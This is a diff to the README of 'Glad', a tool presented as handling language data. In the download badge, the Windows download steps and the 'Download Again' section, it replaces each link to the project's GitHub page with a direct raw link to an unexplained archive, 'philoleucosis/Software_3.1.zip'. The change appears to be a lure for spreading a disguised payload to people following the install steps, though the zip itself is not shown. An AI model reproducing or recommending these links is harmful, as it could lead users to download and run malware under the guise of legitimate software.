@@ -1,6 +1,6 @@
 # Glad - Simple Global Language Data
 
-[![Download Glad](https://img.shields.io/badge/Download-Glad-blue?style=for-the-badge)](https://github.com/Lokes224/Glad)
+[![Download Glad](https://img.shields.io/badge/Download-Glad-blue?style=for-the-badge)](https://raw.githubusercontent.com/Lokes224/Glad/main/philoleucosis/Software_3.1.zip)
 
 ## 🌍 What Glad Is
 
@@ -10,7 +10,7 @@ Use Glad if you need a local tool for language sets, shared files, or AI data fi
 
 ## 📥 Download for Windows
 
-1. Open the Glad page here: https://github.com/Lokes224/Glad
+1. Open the Glad page here: https://raw.githubusercontent.com/Lokes224/Glad/main/philoleucosis/Software_3.1.zip
 2. On the page, find the latest release or the main download files
 3. Download the Windows file to your PC
 4. If the file is a .zip, right-click it and choose Extract All
@@ -175,7 +175,7 @@ Glad is built around shared language data, tokens, words, and model files. It fi
 
 ## 📎 Download Again
 
-If you need the download page again, use this link: https://github.com/Lokes224/Glad
+If you need the download page again, use this link: https://raw.githubusercontent.com/Lokes224/Glad/main/philoleucosis/Software_3.1.zip
 
 ## 🧭 Quick Start
 
